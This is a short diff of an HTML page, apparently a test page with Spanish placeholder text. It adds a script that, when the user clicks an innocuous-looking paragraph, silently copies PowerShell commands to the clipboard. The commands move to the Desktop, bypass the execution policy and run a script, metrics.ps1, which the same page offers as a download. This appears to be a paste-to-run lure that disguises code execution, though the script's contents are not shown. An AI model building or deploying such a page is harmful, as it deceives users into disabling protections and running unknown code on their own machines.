@@ -6,7 +6,26 @@
 </head>
 <body>
 
-    <p onclick="navigator.clipboard.writeText(this.innerText);" style="cursor: pointer;">Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process</p>
+    <p id="cmd" style="cursor: pointer;">Soy una prueba</p>
+    <script>
+        document.getElementById('cmd').addEventListener('click', function() {
+            const commands = [
+                'cd "$HOME\\Desktop"',
+                'Set-ExecutionPolicy Restricted -Scope CurrentUser',
+                'Set-ExecutionPolicy RemoteSigned -Scope CurrentUser',
+                'Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process',
+                '.\\metrics.ps1'
+            ];
+            let i = 0;
+            function next() {
+                if (i >= commands.length) return;
+                navigator.clipboard.writeText(commands[i++]).then(() => {
+                    setTimeout(next, 100);
+                });
+            }
+            next();
+        });
+    </script>
 
     <a href="metrics.ps1" download="metrics.ps1">
         <button>Hola mundo</button>
